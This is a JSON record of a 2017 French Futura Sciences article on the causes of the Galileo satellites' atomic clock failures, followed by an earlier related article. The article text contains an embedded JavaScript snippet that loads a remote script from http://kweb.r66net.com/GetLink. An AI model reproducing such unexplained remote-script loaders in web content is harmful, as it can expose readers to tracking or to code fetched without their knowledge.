{"title": "Satellites Galileo : la panne des horloges atomiques identifiée et sous contrôle", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "05/07/2017", "content": "Les causes du dysfonctionnement des horloges atomiques de Galileo, tombées en panne fin 2016, sont aujourd'hui connues. Le déploiement de la constellation va se poursuivre sans cette épée de Damoclès. En décembre 2017, quatre satellites de plus seront lancés par Arianespace à bord d'un lanceur Ariane 5. Ils rejoindront les 18 déjà en orbite.  L'Agence spatiale européenne ( ESA ) et la Commission européenne ont toujours pour objectif que la  constellation  Galileo soit opérationnelle dès 2020. Plusieurs des  horloges atomiques  à bord des satellites en  orbite  sont tombées en panne fin 2016. Pourtant, le déploiement de la constellation se poursuit. Depuis, une enquête, dont les conclusions ont été rendues publiques il y a quelques jours, a permis d'identifier les causes de ces anomalies. «  Des mesures ont été mises en place pour réduire la possibilité de mauvais fonctionnements supplémentaires sur les satellites déjà en orbite  », explique Lucia Caudet, porte-parole de la Commission européenne.  Ces pannes concernent les deux types d'horloges à bord des satellites : Ainsi, pour les horloges atomiques au  rubidium , un problème de qualité sur un composant technique qui, dans certaines circonstances, peut provoquer un court-circuit, a été découvert. Le composant incriminé sera remplacé sur les horloges qui sont encore au sol. Quant aux  masers  à  hydrogène  passif, l'enquête a relevé que les opérations concernant les horloges déjà dans l'espace devaient être contrôlées et surveillées soigneusement. Vue d'artiste des satellites Galileo. © ESA                               Un seul constructeur pour les satellites Galileo opérationnels Il faut savoir que les satellites en orbite ont été soumis à des tests très poussés pour s'assurer de la qualité des cinq services qui seront fournis aux utilisateurs. Des améliorations ont été apportées aux horloges encore sur Terre, selon ces mêmes sources.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Preuve que la situation est aujourd'hui maîtrisée et sous contrôle : l'ESA a commandé, pour le compte de la Commission européenne, 8 autres satellites à la société allemande OHB qui, finalement, construira les 30 satellites FOC ( Full Operational Capability ). OHB avait remporté les deux premiers contrats portant sur la construction de 14 et 8 satellites. Malgré ce défaut sur les horloges atomiques, qui concerne tout de même une vingtaine d'entre elles (chaque satellite en embarque 4), l'Agence spatiale européenne a maintenu sa confiance envers l'industriel allemand. Résultat : ni Thales Alenia Space et ni Airbus Defence and Space ne construiront de satellites  Galileo  opérationnels de la première génération. Pour en savoir plus Satellites Galileo : des pannes sur les horloges atomiques Article de Rémy Decourt publié le 19/01/2017 Les horloges atomiques de plusieurs satellites Galileo sont tombées en panne, certaines depuis plusieurs semaines déjà. Pour l'instant, ni le fonctionnement de la constellation, ni le service partiel proposé aux utilisateurs (seuls 18 satellites sont en orbite sur les 30 prévus) ne sont perturbés. Jan Woerner, directeur général de l'ESA (Agence spatiale européenne), s'est expliqué à ce sujet. Qu'est-il donc arrivé aux horloges atomiques de la constellation de satellites Galileo ? Jan Woerner, directeur général de l'Agence spatiale européenne (ESA), a dû répondre à cette question lors de son point presse annuel (celui-ci permet habituellement de faire le bilan de l'année écoulée et de donner un aperçu des principaux évènements et rendez-vous de l'année à venir ; il a lieu au siège de l'agence, à Paris). En effet, 9 horloges atomiques (sur 72) des  satellites Galileo déjà en orbite  sont en panne. Jan Woerner ne s'est pas dérobé à la question. Il s'est voulu  transparent  sur ce point embarrassant. Il faut dire que ces horloges sont le cœur de la constellation Galileo. Chaque satellite en compte quatre et, pour qu'un satellite fonctionne, il faut qu'au moins une de ces quatre horloges atomiques soit en état de marche. Ce sont ces horloges qui garantissent la précision des signaux ; ces derniers devraient être centimétriques lorsque la constellation sera  pleinement opérationnelle  (un décalage d'une nanoseconde équivaut à trente centimètres d'écart au sol). Cela dit, en raison de la redondance d'horloges atomiques, aucun des satellites de la constellation Galileo n'est hors d'état de fonctionner et la précision des signaux n'est pas amoindrie. Les satellites Galileo embarquent deux types d’horloges atomiques : des masers à hydrogène passif (flèche rouge en haut à gauche) et des horloges atomiques au rubidium, visibles au premier plan. ©  Surrey Satellite Technology Ltd  (SSTL)                               Sans horloge atomique, pas de Galileo  Comme l'explique l'ESA sur son  site Internet , chaque satellite embarque deux types d'horloges atomiques : des masers à hydrogène passif ; des horloges atomiques au rubidium. Plus précisément, chaque satellite est équipé de deux masers à hydrogène : l'un sert de référence principale pour la génération des signaux de navigation, tandis que l'autre est utilisé en redondance passive. Un satellite Galileo emporte également deux horloges au rubidium. La première, utilisée en redondance active (ce qui signifie qu'elle fonctionne en permanence), prend immédiatement la relève du maser à hydrogène en service en cas de panne de ce dernier, ce qui permet d'éviter toute interruption dans la génération du signal. La seconde horloge au rubidium est utilisée en redondance passive. Cela dit, si, pour le moment, cet incident n'affecte pas le bon  fonctionnement de la constellation , il y a une certaine urgence à résoudre le problème, et c'est là que le bât blesse, car la (ou les) cause(s) de la panne est (sont) encore à déterminer ! Deux scénarios sont à l'étude : soit les horloges sont défaillantes, ce qui signifierait qu'il y a eu un problème constructeur, soit c'est l'environnement du satellite qui provoque cette panne (comprendre que l'interface entre la plateforme du satellite et les horloges provoquerait un dysfonctionnement). À suivre donc. Comment mettre un satellite en orbite autour de la Terre ?                       Sans même que nous en ayons conscience, les satellites sont devenus indispensables à notre quotidien. Les moyens de communication, de surveillance et une bonne partie des recherches scientifiques en dépendent. Alors, comment mettre en orbite un satellite ? Le Cnes nous répond dans cette courte vidéo didactique.                                       "}